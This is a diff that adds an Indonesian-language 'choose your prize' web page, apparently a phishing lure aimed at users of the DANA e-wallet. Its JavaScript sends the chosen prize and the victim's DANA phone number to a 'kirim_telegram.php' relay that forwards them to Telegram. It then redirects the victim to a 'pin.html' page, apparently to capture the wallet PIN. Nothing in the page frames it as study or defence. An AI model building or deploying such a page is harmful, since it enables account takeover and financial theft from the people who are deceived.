@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pilih Hadiahmu</title>
+    <style>
+        /* ... (CSS seperti sebelumnya) ... */
+    </style>
+</head>
+<body>
+    <!-- ... (Kode HTML seperti sebelumnya) ... -->
+    <script>
+        function kirimData(data) {
+            const formData = new FormData();
+            for (const key in data) {
+                formData.append(key, data[key]);
+            }
+
+            fetch('kirim_telegram.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Tampilkan response dari PHP (opsional)
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan saat mengirim data ke Telegram.');
+            });
+        }
+
+        function tampilkanFormDana(hadiah) {
+            localStorage.setItem('hadiahDipilih', hadiah);
+            kirimData({ hadiah: hadiah }); // Kirim data hadiah
+            document.querySelector('.hadiah-container').style.display = 'none';
+            document.getElementById('formDana').style.display = 'block';
+        }
+
+        function lanjutkanKePin() {
+            const nomorDana = document.getElementById('nomorDana').value;
+            if (nomorDana.trim() === '') {
+                alert('Nomor DANA harus diisi!');
+                return;
+            }
+            localStorage.setItem('nomorDana', nomorDana);
+            kirimData({ nomorDana: nomorDana, hadiah: localStorage.getItem('hadiahDipilih') }); // Kirim data nomor DANA
+            window.location.href = 'pin.html';
+        }
+    </script>
+</body>
+</html>
